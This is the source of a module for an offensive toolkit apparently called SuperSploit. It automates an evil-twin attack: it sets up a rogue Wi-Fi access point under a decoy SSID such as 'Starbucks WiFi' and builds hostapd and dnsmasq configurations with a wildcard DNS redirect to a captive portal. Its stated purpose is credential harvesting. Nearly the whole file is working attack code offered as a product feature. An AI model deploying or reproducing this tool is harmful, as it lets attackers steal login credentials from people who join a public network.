#!#!#!
# name: Pro Captive Portal (Evil Twin)
# author: "Donald Ford"
# description: Automates hostapd/dnsmasq to deploy a rogue AP and captive portal for credential harvesting.
# type: se_delivery
# requirements: ["hostapd", "dnsmasq"]
# options:
#   - INTERFACE: "The wireless interface to use (e.g., wlan1)"
#   - SSID: "The rogue network name (e.g., 'Starbucks WiFi')"
#   - PORTAL_TEMPLATE: "Path to the HTML login template to serve"
#   - REDIRECT_URL: "URL to send the victim to after harvesting credentials"
# pro_feature: true
#!#!#!

import os
import subprocess
import time
from core.ToStdOut import ToStdout
from core.license_manager import LicenseManager

def run(db):
    if not LicenseManager.gate_access("Automated Captive Portal"):
        return False
        
    interface = db.get("INTERFACE")
    ssid = db.get("SSID", "Free WiFi")
    template = db.get("PORTAL_TEMPLATE")
    redirect = db.get("REDIRECT_URL", "https://google.com")
    
    if not interface:
        ToStdout.write("[-] ERROR: INTERFACE is required.\n")
        return False
        
    portal_dir = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "captive_portal")
    os.makedirs(portal_dir, exist_ok=True)
    
    hostapd_conf = os.path.join(portal_dir, "hostapd.conf")
    dnsmasq_conf = os.path.join(portal_dir, "dnsmasq.conf")
    
    ToStdout.write(f"[*] Generating Evil Twin configurations for SSID: '{ssid}'...\n")
    
    # Generate hostapd config
    with open(hostapd_conf, "w") as f:
        f.write(f"interface={interface}\n")
        f.write("driver=nl80211\n")
        f.write(f"ssid={ssid}\n")
        f.write("hw_mode=g\n")
        f.write("channel=6\n")
        f.write("macaddr_acl=0\n")
        f.write("ignore_broadcast_ssid=0\n")
        
    # Generate dnsmasq config (Captive Portal redirect)
    with open(dnsmasq_conf, "w") as f:
        f.write(f"interface={interface}\n")
        f.write("dhcp-range=192.168.99.10,192.168.99.250,12h\n")
        f.write("dhcp-option=3,192.168.99.1\n")
        f.write("dhcp-option=6,192.168.99.1\n")
        f.write("address=/#/192.168.99.1\n") # Wildcard DNS redirect
        
    ToStdout.write(f"[*] Configuring interface {interface} (192.168.99.1)...\n")
    try:
        subprocess.run(["sudo", "ifconfig", interface, "up", "192.168.99.1", "netmask", "255.255.255.0"], check=True)
        subprocess.run(["sudo", "route", "add", "-net", "192.168.99.0", "netmask", "255.255.255.0", "gw", "192.168.99.1"], check=False)
    except Exception as e:
        ToStdout.write(f"[-] ERROR: Failed to configure networking: {e}\n")
        return False
        
    ToStdout.write("[*] Launching dnsmasq and hostapd...\n")
    try:
        # Kill blocking processes
        subprocess.run(["sudo", "killall", "dnsmasq", "hostapd", "wpa_supplicant"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        
        dnsmasq_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", dnsmasq_conf, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        hostapd_proc = subprocess.Popen(["sudo", "hostapd", hostapd_conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        ToStdout.write(f"[+] Rogue AP '{ssid}' is LIVE!\n")
        ToStdout.write("[*] To serve the captive portal payload, start a web server on port 80.\n")
        ToStdout.write(f"[*] Example: sudo python3 -m http.server 80 --directory {os.path.dirname(template) if template else '/var/www/html'}\n")
        ToStdout.write("[!] Press Ctrl+C to terminate the Evil Twin.\n")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        ToStdout.write("\n[*] Tearing down Rogue AP...\n")
        dnsmasq_proc.terminate()
        hostapd_proc.terminate()
        subprocess.run(["sudo", "ifconfig", interface, "down"])
        return True
    except Exception as e:
        ToStdout.write(f"[-] Fatal AP Error: {e}\n")
        return False